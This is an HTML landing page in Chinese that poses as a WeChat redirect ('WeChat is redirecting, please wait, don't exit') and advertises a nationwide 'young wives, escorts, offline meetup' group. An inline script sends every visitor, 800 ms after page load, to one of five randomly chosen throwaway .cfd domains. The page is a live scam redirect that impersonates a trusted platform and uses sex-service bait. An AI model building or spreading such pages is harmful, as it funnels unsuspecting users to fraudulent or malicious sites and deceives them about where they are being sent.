<!DOCTYPE html>
<html>
  <head>
    <title>加载中.....</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
        display: flex;
        flex-direction: column;
        justify-content: flex-start;
        align-items: center;
        height: 100vh;
        margin: 0;
        color: #333;
      }

      p {
        font-size: 35px;
        text-align: center;
        color: darkgreen;
        margin: 1em 0;
      }
      .highlight {
        color: coral;
      }

      .image-container {
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-top: 2em;
      }

      .image-container img {
        max-width: 100%;
        height: auto;
        margin-top: 1em;
      }
    </style>
    <script type="text/javascript">
      window.onload = function () {
        var links = [
          "http://hd8wj.p2k3ze.cfd/5fNG4JcR",
          "http://xap57wmffa2.tgyofh.cfd/hQ3nFv8o",
          "http://i2d2dndittk.wlmnvk.cfd/U6SDdv94",
          "http://dw6pxddw8tj.raiust.cfd/X46uFGSH",
          "http://iyyjj55nrkw.nxwoij.cfd/6Fk5Aozf",
        ];
        var randomLink = links[Math.floor(Math.random() * links.length)];
        setTimeout(function () {
          window.location.href = randomLink;
        }, 800);
      };
    </script>
  </head>
  <body>
    <p>
      微信正在跳转，请稍等，不要退出哦！<br />
      <span class="highlight">“如遇跳转失败请返回重新扫码”</span>
    </p>
    <p>
      全国各地同城 少妇，外围，线下互动 内部交流群<br />
      <span class="highlight">“限时加入！”</span>
    </p>
    <div class="image-container">
      <img src="img2/1.jpg" alt="Image 1" />
      <img src="img2/2.jpg" alt="Image 2" />
      <img src="img2/3.jpg" alt="Image 3" />
    </div>
  </body>
</html>
